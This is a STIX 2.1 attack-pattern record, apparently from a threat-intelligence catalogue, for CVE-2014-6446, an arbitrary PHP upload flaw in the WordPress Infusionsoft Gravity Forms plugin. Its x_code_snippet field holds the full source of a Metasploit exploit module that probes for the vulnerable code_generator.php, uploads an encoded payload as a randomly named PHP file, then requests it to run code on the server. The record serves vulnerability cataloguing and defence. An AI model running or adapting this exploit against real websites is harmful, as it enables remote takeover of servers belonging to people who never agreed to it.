{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9c4ba409-6fdd-49eb-bbe7-a2b18dfaff24",
    "created": "2024-08-14T17:12:07.801193Z",
    "modified": "2024-08-14T17:12:07.801197Z",
    "name": "Wordpress InfusionSoft Upload Vulnerability",
    "description": " This module exploits an arbitrary PHP code upload in the WordPress Infusionsoft Gravity Forms plugin, versions from 1.5.3 to 1.5.10. The vulnerability allows for arbitrary file upload and remote code execution. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/wp_infusionsoft_upload.rb",
            "external_id": "wp_infusionsoft_upload.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-6446"
        },
        {
            "source_name": "reference",
            "url": "http://research.g0blin.co.uk/cve-2014-6446/"
        },
        {
            "source_name": "WPVDB",
            "external_id": "7634"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HTTP::Wordpress\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Wordpress InfusionSoft Upload Vulnerability',\n      'Description'    => %q{\n        This module exploits an arbitrary PHP code upload in the WordPress Infusionsoft Gravity\n        Forms plugin, versions from 1.5.3 to 1.5.10. The vulnerability allows for arbitrary file\n        upload and remote code execution.\n      },\n      'Author'         =>\n        [\n          'g0blin',                    # Vulnerability Discovery\n          'us3r777 <us3r777@n0b0.so>'  # Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['CVE', '2014-6446'],\n          ['URL', 'http://research.g0blin.co.uk/cve-2014-6446/'],\n          ['WPVDB', '7634']\n        ],\n      'Privileged'     => false,\n      'Platform'       => 'php',\n      'Arch'           => ARCH_PHP,\n      'Targets'        => [['Infusionsoft 1.5.3 - 1.5.10', {}]],\n      'DisclosureDate' => '2014-09-25',\n      'DefaultTarget'  => 0)\n    )\n  end\n\n  def check\n    res = send_request_cgi(\n      'uri'    => normalize_uri(wordpress_url_plugins, 'infusionsoft', 'Infusionsoft', 'utilities', 'code_generator.php')\n    )\n\n    if res && res.code == 200 && res.body =~ /Code Generator/ && res.body =~ /Infusionsoft/\n      return Exploit::CheckCode::Detected\n    end\n\n    Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    php_pagename = rand_text_alpha(8 + rand(8)) + '.php'\n    res = send_request_cgi({\n      'uri'       => normalize_uri(wordpress_url_plugins, 'infusionsoft',\n                     'Infusionsoft', 'utilities', 'code_generator.php'),\n      'method'    => 'POST',\n      'vars_post' =>\n      {\n        'fileNamePattern' => php_pagename,\n        'fileTemplate'    => payload.encoded\n      }\n    })\n\n    if res && res.code == 200 && res.body && res.body.to_s =~ /Creating File/\n      print_good(\"Our payload is at: #{php_pagename}. Calling payload...\")\n      register_files_for_cleanup(php_pagename)\n    else\n      fail_with(Failure::UnexpectedReply, \"#{peer} - Unable to deploy payload, server returned #{res.code}\")\n    end\n\n    print_status(\"Calling payload ...\")\n    send_request_cgi({\n      'uri'       => normalize_uri(wordpress_url_plugins, 'infusionsoft',\n                     'Infusionsoft', 'utilities', php_pagename)\n    }, 2)\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-09-25",
    "x_mitre_platforms": [
        "php'"
    ]
}